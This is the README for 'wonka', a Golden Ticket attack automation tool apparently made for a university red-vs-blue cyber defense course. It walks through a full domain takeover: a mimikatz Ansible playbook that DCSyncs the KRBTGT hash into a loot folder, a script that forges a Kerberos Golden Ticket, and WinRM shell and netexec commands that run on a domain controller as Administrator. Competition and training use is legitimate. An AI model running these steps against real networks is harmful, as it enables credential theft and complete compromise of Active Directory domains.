# wonka
Golden Ticket attack automation for red vs blue competitions
#### Created by Braeden Villano for CSEC-473 Cyber Defense Techniques
## Prerequisites
### DNS
For the attack to work Kerberos needs to be able to resolve the FQDN (can add to /etc/hosts if you need to).  
Additionally, if your host is unable to resolve the DNS SRV records needed to use the created Golden Ticket, copy krb5.conf to /etc/krb5.conf and replace the example **red.local** domain with the target domain.
## Setup
These setup instructions assume you are using Kali Linux. If using a different operating system the instructions may slightly differ

### Install packages
```
sudo apt install ansible python3-impacket python3-winrm python3-requests-kerberos krb5-user
```

### Create Ansible Inventory
Modify the ansible inventory in ansible/inventory.ini, or create your own. Targets for the mimikatz.yml playbook used to gather the required information to forge the Golden Ticket should be in a group called **domain-controllers**

### Run the Ansible Playbook
Run the Ansible playbook against the target hosts. First, cd into the ansible directory and then run:
```
ansible-playbook -i inventory.ini mimikatz.yml
```
This will output the results of the DCSYNC command used to obtain the KRBTGT hash and domain SID to ./loot/{{ inventory_hostname }}_dcsync.txt.

### Generate JSON File
To generate the json file needed for the wonka.py script to forge a Golden Ticket, run the command:
```
python3 json-gen.py $FILENAME -d red.local -o output.json
```
replacing the red.local example domain with the domain you are forging the ticket for and $FILENAME with the dcsync results txt file from the previous step. -o is used to specify the output filename, otherwise the json will just be printed to stdout

### Forge Ticket with wonka.py
To forge the ticket, run:
```
python3 wonka.py file.json
```
Replacing file.json with the json file from the previous step

## Using the Golden Ticket
The created ticket can be used with any tool with support for Kerberos tickets. Additionally, the wsh.py (Wonka SHell) provides a WinRM shell using the created Golden Ticket

Instructions for using wsh.py and an example using netexec are shown below

### wsh.py
```
python3 wsh.py -k Administrator.ccache
```
replacing Administrator.ccache to the location of a generated .ccache file  
This will give you an interactive WinRM shell to execute commands

### netexec
```
export KRB5CCNAME=$(pwd)/Administrator.ccache

nxc smb dc.red.local -u Administrator --use-kcache --kdcHost dc.red.local -X "whoami"
```
This is just one example for using netexec for command execution. Netexec gives a lot of ways to interact with Windows targets using the same Kerberos-related arguments to use the generated Golden Ticket